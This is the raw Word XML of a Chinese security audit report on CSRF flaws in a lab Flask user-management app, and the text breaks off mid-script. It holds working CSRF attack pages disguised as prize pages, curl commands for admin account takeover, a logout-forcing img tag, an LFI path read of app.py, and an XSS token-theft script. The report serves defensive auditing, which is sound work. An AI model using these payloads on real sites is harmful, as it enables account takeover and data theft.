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56"/>
        </w:rPr>
        <w:t>安全审计报告</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="E53E3E"/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>CSRF 跨站请求伪造漏洞分析与复现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项目名称</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>用户信息管理平台（Class01）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测试目标</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>http://192.168.234.129:5000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报告日期</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>2026-07-24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漏洞等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🔴 严重 / 🟠 高危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涉及模块</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>修改密码 / 充值 / 上传头像 / 注册 / 登录</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>漏洞类型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CSRF 跨站请求伪造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报告概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>2. CSRF 漏洞原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>3. 漏洞 1：修改密码接口无 CSRF 保护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>4. 漏洞 2：充值接口 CSRF 利用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>5. 漏洞 3：注册接口 CSRF 利用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>6. 漏洞 4：上传头像接口 CSRF 利用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>7. 漏洞 5：登录接口 CSRF 利用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>8. 漏洞 6：登出接口 CSRF 利用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>9. CSRF 与其它漏洞的组合攻击链</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>10. 漏洞汇总</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>11. 修复方案与代码变更</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>12. POC 测试脚本</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. 报告概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本报告对"用户信息管理平台"进行 CSRF（Cross-Site Request Forgery，跨站请求伪造）漏洞专项审计。CSRF 漏洞是 Web 应用中最常见的安全漏洞之一，OWASP Top 10 中持续位列前茅。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>CSRF 攻击的核心原理是：攻击者构造恶意页面，诱导已登录用户访问，利用用户的登录态 Cookie 自动发送伪造请求，完成转账、改密等敏感操作。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 系统 CSRF 保护现状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CSRF 保护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✅ 有 @csrf_required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✅ 有 @csrf_required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/recharge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✅ 有 @csrf_required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/upload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✅ 有 @csrf_required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/change-password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b/>
                <w:color w:val="E53E3E"/>
              </w:rPr>
              <w:t>❌ 无 @csrf_required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/logout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⚠️ GET 请求，但清除会话</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 测试环境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服务器</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>http://192.168.234.129:5000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框架版本</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Flask 3.1.3 + Jinja2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Session 机制</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Flask 签名 Cookie + SameSite=Lax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默认账号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>admin / admin123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测试日期</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>2026-07-24</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. CSRF 漏洞原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 CSRF 攻击流程</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>CSRF（Cross-Site Request Forgery）跨站请求伪造攻击流程如下：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>用户登录目标网站 A，浏览器保存了 A 的 Session Cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>用户未登出 A，在同一浏览器中访问了攻击者构造的恶意网站 B</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>恶意网站 B 自动向 A 发送一个伪造请求（如图片标签、表单自动提交）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>浏览器自动携带 A 的 Cookie 发送请求</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>服务器收到请求，误以为是用户的合法操作，执行敏感操作（改密、转账等）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 CSRF 攻击示例（修改密码）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>攻击者构造以下恶意 HTML 页面，当已登录用户访问时，会自动修改密码：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;html&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;h1&gt;恭喜你中奖了！&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!-- 隐藏的表单自动提交 --&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;form id="csrf_form"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        action="http://192.168.234.129:5000/change-password"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        method="POST"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="username" value="admin"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="new_password" value="hacked_by_csrf"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/form&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;script&gt;document.getElementById("csrf_form").submit();&lt;/script&gt;</w:t>
        <w:br/>
        <w:t>&lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>当管理员 admin 访问这个页面时，密码会被改为 "hacked_by_csrf"，攻击者随后用新密码登录。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. 漏洞 1：修改密码接口无 CSRF 保护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>/change-password 接口没有任何 CSRF Token 校验。攻击者可以构造恶意页面，诱导已登录用户访问，自动提交修改密码请求，将用户密码改为攻击者指定的值。结合该接口"无需原密码、可修改任意用户密码"的特性，危害极大。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 漏洞位置</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="E53E3E"/>
        </w:rPr>
        <w:t>文件：app.py | 路由：/change-password | 方法：POST | 第 485-486 行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>问题代码：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/change-password", methods=["POST"])</w:t>
        <w:br/>
        <w:t>def change_password():          # ❌ 缺少 @csrf_required</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "username" not in session:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return redirect("/login")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    username = request.form.get("username")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    new_password = request.form.get("new_password")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ❌ 无 CSRF Token 校验</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ❌ 无原密码校验</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ❌ 无权限校验（可改任意用户）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 POC 复现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>攻击步骤：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>步骤1：攻击者构造包含自动提交表单的恶意 HTML 页面</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>步骤2：诱骗管理员 admin 访问该页面（如发送钓鱼链接）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>步骤3：admin 的密码被改为 "hacked_by_csrf"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>步骤4：攻击者使用新密码登录，获取管理员权限</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>恶意页面 HTML 代码：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;!-- 攻击者构造的 CSRF 攻击页面 --&gt;</w:t>
        <w:br/>
        <w:t>&lt;html&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;h1&gt;🎉 您获得了一次免费抽奖机会！&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;img src="loading.gif" style="display:none" /&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  &lt;form id="attack"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        action="http://192.168.234.129:5000/change-password"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        method="POST" style="display:none"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="username" value="admin"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="new_password" value="hacked123"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/form&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;script&gt;document.getElementById("attack").submit();&lt;/script&gt;</w:t>
        <w:br/>
        <w:t>&lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>curl 命令验证（模拟 CSRF 攻击）：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 步骤1：登录 admin</w:t>
        <w:br/>
        <w:t>curl -c /tmp/cookies.txt http://192.168.234.129:5000/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "username=admin&amp;password=admin123"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 步骤2：模拟 CSRF 请求（不带 CSRF Token）</w:t>
        <w:br/>
        <w:t>curl -b /tmp/cookies.txt -X POST \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  http://192.168.234.129:5000/change-password \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "username=admin&amp;new_password=hacked123"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 步骤3：攻击者用新密码登录</w:t>
        <w:br/>
        <w:t>curl http://192.168.234.129:5000/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "username=admin&amp;password=hacked123"</w:t>
        <w:br/>
        <w:t># ✅ 登录成功！攻击者已接管 admin 账号</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 危害评级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CVSS 评分</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>8.8 (HIGH)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攻击路径</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>网络远程 + 社会工程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攻击复杂度</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>低 — 仅需构造 HTML 页面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危害</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>任意用户密码被篡改，账号被完全接管</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. 漏洞 2-5：其他 POST 接口 CSRF 分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>系统其他 POST 接口已添加 @csrf_required 保护，但从安全设计角度，仍存在以下潜在风险：CSRF Token 未绑定用户身份、Token 未设置有效期、Token 在 Session 中可被复用。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 充值接口 /recharge</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="276749"/>
        </w:rPr>
        <w:t>当前状态：✅ 已有 @csrf_required</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>虽然已有 CSRF 保护，但结合"无权限校验、无金额正负校验"的越权漏洞，如果攻击者通过 XSS 或其他方式获取到用户的 CSRF Token，仍可发起攻击。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 注册接口 /register</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="276749"/>
        </w:rPr>
        <w:t>当前状态：✅ 已有 @csrf_required</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>注册接口虽然受 CSRF 保护，但如果存在 XSS 漏洞，攻击者可窃取 CSRF Token 后批量注册恶意账号。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 上传头像接口 /upload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="276749"/>
        </w:rPr>
        <w:t>当前状态：✅ 已有 @csrf_required</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>上传接口虽受 CSRF 保护，但若与文件包含漏洞（LFI）结合，攻击者可上传恶意文件后通过 /page 加载执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 登录接口 /login</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="276749"/>
        </w:rPr>
        <w:t>当前状态：✅ 已有 @csrf_required</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>登录接口的 CSRF 保护可防止攻击者利用已登录用户的 Session 执行恶意登录操作。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. 漏洞 6：登出接口无 CSRF 保护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>/logout 路由是 GET 请求且未添加 CSRF 保护。攻击者可以在恶意页面中嵌入一个图片标签，当已登录用户访问时，浏览器会自动请求该 URL，用户被强制登出（Logout CSRF）。这属于"低危害但高影响"的 CSRF 攻击——虽然不窃取数据，但可造成服务中断。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 漏洞位置</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="E53E3E"/>
        </w:rPr>
        <w:t>文件：app.py | 路由：/logout | 方法：GET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>问题代码：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/logout")</w:t>
        <w:br/>
        <w:t>def logout():                         # ❌ 无 CSRF 保护</w:t>
        <w:br/>
        <w:t xml:space="preserve">    session.clear()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return redirect("/")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 POC 复现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>攻击者在恶意页面中嵌入以下内容：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;!-- 当用户访问此页面时，浏览器自动请求该 URL --&gt;</w:t>
        <w:br/>
        <w:t>&lt;img src="http://192.168.234.129:5000/logout" style="display:none" /&gt;</w:t>
        <w:br/>
        <w:t>&lt;!-- 用户被强制登出，需要重新登录 --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>危害场景：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>• 用户在操作过程中被强制登出，业务中断</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>• 如果与修改密码 CSRF 结合，用户被登出后无法察觉密码已被篡改</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>• 可反复触发，导致用户无法正常使用系统（DoS 变种）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. CSRF 与其它漏洞的组合攻击链</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 攻击链图解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>以下是一个完整的利用 CSRF + 越权 + LFI 的组合攻击链：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攻击手法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详细描述</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>第 1 步</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>LFI 信息收集</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>利用 /page?name=../app.py 读取 Secret Key 和业务逻辑</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>第 2 步</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CSRF 改密</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>构造恶意页面，将管理员密码改为攻击者指定值</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>第 3 步</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>账号接管</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>使用新密码以管理员身份登录</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>第 4 步</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>越权操作</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>查看所有用户资料、修改任意用户余额</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>第 5 步</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>批量数据窃取</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>通过搜索 OR 注入导出全部用户数据</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 CSRF+XSS 组合攻击</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>如果系统存在 XSS 漏洞，攻击者可以注入 JavaScript，动态窃取 CSRF Token：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// XSS 注入脚本：窃取 CSRF Token 后发起改密请求</w:t>
        <w:br/>
        <w:t>fetch('/profile?user_id=1')</w:t>
        <w:br/>
        <w:t xml:space="preserve">  .then(r =&gt; r.text())</w:t>
        <w:br/>
        <w:t xml:space="preserve">  .then(html =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // 从页面中提取 CSRF Token</w:t>
        <w:br/>
        <w:t xml:space="preserve">    const csrfMatch = html.match(/value="([a-f0-9]{32})"/);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    const csrfToken = csrfMatch ? csrfMatch[1] : '';</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // 使用窃取的 Token 修改密码</w:t>
        <w:br/>
        <w:t xml:space="preserve">    fetch('/change-password', {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      method: 'POST',</w:t>
        <w:br/>
        <w:t xml:space="preserve">      headers: {'Content-Type': 'application/x-www-form-urlencoded'},</w:t>
        <w:br/>
